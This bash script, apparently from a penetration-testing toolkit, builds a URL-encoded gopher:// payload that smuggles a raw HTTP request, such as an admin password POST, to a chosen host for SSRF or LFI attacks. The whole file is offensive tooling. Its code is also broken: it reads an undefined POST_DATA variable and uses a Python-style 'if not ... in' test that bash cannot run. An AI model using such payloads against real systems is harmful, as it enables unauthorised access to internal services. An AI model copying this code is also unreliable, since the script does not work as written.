#!/bin/bash

: '
gopher: print post request url for lfi urlencoded
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
HOST_FIELD=$(form_item "host" "host" "domain.ltd")
PORT_FIELD=$(form_item "port" "number" "port" "80")
PATH_LOCATION_FIELD=$(form_item "path" "path" "/file.ext")
METHOD_FIELD=$(form_item "method" "select" "method" "POST" "POST|GET|OPTIONS|HEAD")
CONTENT_TYPE_FIELD=$(form_item "content type" "content_type" "application/x-www-form-urlencoded")
REQUEST_DATA_FIELD=$(form_item "request data (get query string or post date)" "request_data" "adminpw=admin")

# Generate GUI form
generate_form "${HOST_FIELD}"  "${PORT_FIELD}" "${PATH_LOCATION_FIELD}"  "${METHOD_FIELD}" "${CONTENT_TYPE_FIELD}" "${REQUEST_DATA_FIELD}"

HOST=${form_data["host"]}
PORT=${form_data["port"]}
METHOD=${form_data["method"]}
PATH_LOCATION=${form_data["path"]}
CONTENT_TYPE=${form_data["content_type"]}
REQUEST_DATA=${form_data["request_data"]}

# create gopher request
if [[ "${METHOD}" == "POST" ]]; then
  gopher_request="gopher://${HOST}:${PORT}/_${METHOD}%20/${PATH_LOCATION}%20HTTP%2F1.1%0D%0AHost:%20${HOST}%0D%0AContent-Length:%20${#POST_DATA}%0D%0AContent-Type:%20${CONTENT_TYPE}%0D%0A%0D%0A${POST_DATA}"
else
  if not "?" in "${REQUEST_DATA}"; then
    REQUEST_DATA="?${REQUEST_DATA}"
  fi

  gopher_request="gopher://${HOST}:${PORT}/_${METHOD}%20/${PATH_LOCATION}${POST_DATA}%20HTTP%2F1.1%0D%0AHost:%20${HOST}%0D%0AContent-Type:%20${CONTENT_TYPE}%0D%0A%0D%0A"
fi

url_encoded=$(printf "%s" "${gopher_request}" | jq -sRr @uri)

execute_command "${url_encoded}"
